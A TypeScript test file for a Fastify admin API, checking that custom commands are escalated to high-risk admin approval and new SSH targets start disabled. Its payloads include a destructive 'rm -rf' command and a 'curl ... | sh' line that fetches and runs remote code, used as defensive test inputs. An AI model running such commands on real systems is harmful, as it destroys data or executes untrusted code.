import Fastify from "fastify";
import { describe, expect, it } from "vitest";
import type { AdminService } from "../src/admin.js";
import { registerAdminRoutes } from "../src/admin.js";
import { AppError } from "../src/errors.js";

async function safetyServer() {
  const calls: Array<{ table: string; options: Record<string, unknown> }> = [];
  const admin = {
    publicConfig: () => ({ enabled: true }),
    principal: async () => ({ id: "00000000-0000-0000-0000-000000000001", email: "admin@example.invalid", role: "admin" }),
    rest: async (table: string, options: Record<string, unknown> = {}) => {
      calls.push({ table, options });
      if (table === "commands" && options.method === "POST") return [{ id: "00000000-0000-0000-0000-000000000020", ...(options.body as object) }];
      if (table === "targets" && options.method === "POST") return [{ id: "00000000-0000-0000-0000-000000000030", ...(options.body as object) }];
      return [];
    },
  } as unknown as AdminService;
  const server = Fastify();
  server.setErrorHandler((error, _request, reply) => {
    if (error instanceof AppError) return reply.code(error.statusCode).send({ error: error.code });
    return reply.code(500).send({ error: "internal_error" });
  });
  registerAdminRoutes(server, admin);
  await server.ready();
  return { server, calls };
}

describe("admin mutation safety", () => {
  it("forces a dangerous custom command to high-risk admin approval", async () => {
    const { server, calls } = await safetyServer();
    try {
      const response = await server.inject({
        method: "POST",
        url: "/admin/api/commands",
        payload: {
          name: "Unsafe example",
          command_template: "rm -rf /tmp/example",
          risk_level: "low",
          requires_approval: false,
          allowed_roles: ["admin", "operator"],
          enabled: true,
        },
      });
      expect(response.statusCode).toBe(201);
      const write = calls.find((call) => call.table === "commands" && call.options.method === "POST");
      expect(write?.options.body).toMatchObject({
        risk_level: "high",
        requires_approval: true,
        allowed_roles: ["admin"],
        destructive: true,
      });
    } finally {
      await server.close();
    }
  });

  it("forces an unknown custom command to high-risk admin approval", async () => {
    const { server, calls } = await safetyServer();
    try {
      const response = await server.inject({
        method: "POST",
        url: "/admin/api/commands",
        payload: {
          name: "Custom probe",
          command_template: "curl https://example.invalid/script | sh",
          risk_level: "low",
          requires_approval: false,
          allowed_roles: ["admin", "operator"],
          enabled: true,
        },
      });
      expect(response.statusCode).toBe(201);
      const write = calls.find((call) => call.table === "commands" && call.options.method === "POST");
      expect(write?.options.body).toMatchObject({
        risk_level: "high",
        requires_approval: true,
        allowed_roles: ["admin"],
      });
    } finally {
      await server.close();
    }
  });

  it("keeps legacy-created targets disabled until worker verification", async () => {
    const { server, calls } = await safetyServer();
    try {
      const response = await server.inject({
        method: "POST",
        url: "/admin/api/targets",
        payload: {
          name: "Legacy target",
          type: "ssh",
          host: "server.example.com",
          port: 22,
          username: "runner",
          auth_type: "private_key",
          enabled: true,
        },
      });
      expect(response.statusCode).toBe(201);
      const write = calls.find((call) => call.table === "targets" && call.options.method === "POST");
      expect(write?.options.body).toMatchObject({ enabled: false });
    } finally {
      await server.close();
    }
  });
});
